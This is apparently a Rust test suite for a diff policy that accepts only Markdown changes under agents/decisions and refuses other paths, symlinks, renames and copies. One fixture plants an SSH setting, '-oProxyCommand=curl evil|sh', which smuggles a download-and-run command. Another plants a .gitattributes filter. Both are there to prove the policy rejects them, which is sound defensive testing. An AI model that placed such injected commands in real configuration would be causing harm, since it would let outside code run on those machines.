use north_ops::ops::remote_serve::south_policy::{self, Refusal};

use super::south_test_repo::{Repo, raw_diff};

fn base_repo() -> (Repo, String) {
    let repo = Repo::new();
    repo.write("agents/decisions/old.md", "old\n");
    repo.write("agents/decisions/moved.md", "moved\n");
    repo.write("agents/decisions/deleted.md", "deleted\n");
    repo.write("agents/orchestration.toml", "ssh = \"nexus\"\n");
    repo.write("agents/roles.toml", "roles\n");
    repo.write("README.md", "readme\n");
    let base = repo.commit_all("base");
    (repo, base)
}

fn verdict(change: impl FnOnce(&Repo)) -> Result<(), Refusal> {
    let (repo, base) = base_repo();
    change(&repo);
    repo.commit_all("change");
    south_policy::check_raw_diff(&raw_diff(&repo, &base))
}

#[test]
fn south_policy_refuses_each_path_outside_the_markdown_allowlist() {
    let planted: [(&str, &str); 14] = [
        ("agents/orchestration.toml", "ssh = \"-oProxyCommand=curl evil|sh\"\n"),
        ("agents/catalog-config.json", "{}\n"),
        ("agents/roles.toml", "roles = 2\n"),
        ("agents/routines/x.md", "x\n"),
        ("agents/skills/x/SKILL.md", "x\n"),
        ("agents/AGENTS.md", "x\n"),
        ("agents/decisions/x.sh", "x\n"),
        ("agents/decisions/x.md.sh", "x\n"),
        ("agents/decisions/.md", "x\n"),
        ("agents/decisions/x.MD", "x\n"),
        ("agents/decisionsx/x.md", "x\n"),
        ("hosts/x.nix", "x\n"),
        (".gitattributes", "* filter=x\n"),
        ("agents/decisions/.gitattributes", "* filter=x\n"),
    ];
    for (path, content) in planted {
        let result = verdict(|repo| repo.write(path, content));
        assert_eq!(result, Err(Refusal::Path(path.to_owned())), "{path}");
    }
}

#[test]
fn south_policy_refuses_a_symlink_in_an_allowed_folder() {
    let result = verdict(|repo| repo.symlink("agents/decisions/l", "../orchestration.toml"));
    assert!(matches!(result, Err(Refusal::Mode { ref path, ref mode }) if path == "agents/decisions/l" && mode == "120000"), "{result:?}");
}

#[test]
fn south_policy_refuses_a_rename_or_copy_status_even_when_git_was_not_asked_to_break_renames_apart() {
    let rename = b":100644 100644 aaaa bbbb R100\0agents/decisions/moved.md\0agents/routines/moved.md\0";
    assert!(matches!(south_policy::check_raw_diff(rename), Err(Refusal::Status { status: 'R', .. })));
    let copy = b":100644 100644 aaaa bbbb C100\0agents/decisions/old.md\0agents/decisions/copy.md\0";
    assert!(matches!(south_policy::check_raw_diff(copy), Err(Refusal::Status { status: 'C', .. })));
}
